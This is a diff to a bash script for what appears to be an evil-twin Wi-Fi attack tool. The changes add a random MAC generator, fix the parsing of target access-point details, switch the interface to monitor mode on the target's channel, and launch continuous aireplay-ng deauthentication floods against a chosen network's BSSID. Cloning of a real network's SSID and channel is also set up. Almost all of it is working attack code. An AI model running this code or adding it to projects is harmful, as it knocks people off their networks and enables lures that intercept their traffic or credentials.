@@ -283,6 +283,20 @@ get_ap_info() {
   '
 }
 
+generate_mac() {
+    hexchars="0123456789ABCDEF"
+    # The first byte: set locally administered (second least significant bit = 1) and unicast (least significant bit = 0)
+    first_byte="02"
+    mac="$first_byte"
+
+    for i in {1..5}; do
+    byte="${hexchars:$(( RANDOM % 16 )):1}${hexchars:$(( RANDOM % 16 )):1}"
+    mac="$mac:$byte"
+    done
+
+    echo "$mac"
+}
+
 select_from_list() {
     local prompt="$1"
     local default_choice=""
@@ -869,27 +883,36 @@ configure_deauth() {
                 mapfile -t available_aps < <(get_wifi_ssids "${DEFAULTS[INTERFACE]}")
                 if (( ${#available_aps[@]} )); then
                     target_ssid=$(select_from_list "Select target AP for deauth:" "${available_aps[@]}")
-                    target_mac=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d -f3 -s '|')
+                    target_mac=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d '|' -f3)
+                    target_channel=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d '|' -f2)
+                    DEFAULTS[DEAUTH_SSID]="${target_ssid}"
                     DEFAULTS[DEAUTH_MAC]="${target_mac}"
+                    DEFAULTS[DEAUTH_CHANNEL]="${target_channel}"
                 else
                     echo "No available APs found."
                     return 1
                 fi
             else
                 target_ssid="${DEFAULTS[DEAUTH_SSID]}"
-                target_mac=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d -f3 -s '|')
+                target_mac=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d '|' -f3)
+                target_channel=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d '|' -f2)
+                DEFAULTS[DEAUTH_SSID]="${target_ssid}"
+                DEFAULTS[DEAUTH_MAC]="${target_mac}"
+                DEFAULTS[DEAUTH_CHANNEL]="${target_channel}"
                 if [[ -z "${target_mac}" ]]; then
                     error "No AP found with SSID '${target_ssid}'"
-                    return 1
                 fi
             fi
         else
             if [[ -n "${ARG[DEAUTH_SSID]}" ]]; then
                 target_ssid="${DEFAULTS[DEAUTH_SSID]}"
-                target_mac=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d -f3 -s '|')
+                target_mac=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d '|' -f3)
+                target_channel=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d '|' -f2)
+                DEFAULTS[DEAUTH_SSID]="${target_ssid}"
+                DEFAULTS[DEAUTH_CHANNEL]="${target_channel}"
+                DEFAULTS[DEAUTH_MAC]="${target_mac}"
                 if [[ -z "${target_mac}" ]]; then
                     error "No AP found with SSID '${target_ssid}'"
-                    return 1
                 fi
                 DEFAULTS[DEAUTH_MAC]="${target_mac}"
             else
@@ -899,12 +922,14 @@ configure_deauth() {
         fi
     else
         target_ssid="${DEFAULTS[CLONE_SSID]}"
-        target_mac=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d -f3 -s '|')
+        target_mac=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d '|' -f3)
+        target_channel=$(get_ap_info "${target_ssid}" "${DEFAULTS[INTERFACE]}" | cut -d '|' -f2)
+        DEFAULTS[DEAUTH_SSID]="${target_ssid}"
+        DEFAULTS[DEAUTH_CHANNEL]="${target_channel}"
+        DEFAULTS[DEAUTH_MAC]="${target_mac}"
         if [[ -z "${target_mac}" ]]; then   
             error "No AP found with SSID '${target_ssid}'"
-            return 1
         fi
-        DEFAULTS[DEAUTH_MAC]="${target_mac}"
     fi
 
     if [[ -n "${DEFAULTS[DEAUTH_MAC]}" ]]; then
@@ -916,12 +941,19 @@ configure_deauth() {
 enable_deauth() {
     if [[ -z "${DEFAULTS[DEAUTH_MAC]}" ]]; then
         error "No target MAC address specified for deauth"
-        return 1
     fi
 
     log "Starting deauthentication attack on ${DEFAULTS[DEAUTH_MAC]} (${DEFAULTS[DEAUTH_SSID]})"
+
+    enable_monitor_mode "${DEFAULTS[INTERFACE]}"
+
+    iwconfig "${DEFAULTS[INTERFACE]}" channel "${DEFAULTS[DEAUTH_CHANNEL]}"
+
+    DEFAULTS[CLONE_MAC]=$(generate_mac)
     
-    aireplay-ng --deauth 0 -a "${DEFAULTS[DEAUTH_MAC]}" "${DEFAULTS[INTERFACE]}" &
+    aireplay-ng --deauth 0 -a "${DEFAULTS[DEAUTH_MAC]}" "${DEFAULTS[INTERFACE]}" --ignore-negative-one >> /var/log/deauth.log 2>&1 </dev/null &
+    log "Deauthentication attack started on ${DEFAULTS[DEAUTH_MAC]} (${DEFAULTS[DEAUTH_SSID]})"
+    log "Aireplay-ng started with PID: $!"
     PIDS+=($!)
 }
 
@@ -1204,9 +1236,9 @@ configure_clone(){
     IFS="|" read -r ssid channel mac < <(get_ap_info "${DEFAULTS[CLONE_SSID]}" "${INTERFACE}")
     DEFAULTS[SSID]="$ssid"
     DEFAULTS[CHANNEL]="$channel"
-    DEFAULTS[MAC]="$mac"
+    #DEFAULTS[MAC]="$mac"
 
-    log "Cloning interface ${INTERFACE} with SSID: ${DEFAULTS[SSID]}, Channel: ${DEFAULTS[CHANNEL]}, MAC: ${DEFAULTS[MAC]}"
+    log "Cloning interface ${INTERFACE} with SSID: ${DEFAULTS[SSID]}, Channel: ${DEFAULTS[CHANNEL]}"
 }
 
 start_services() {
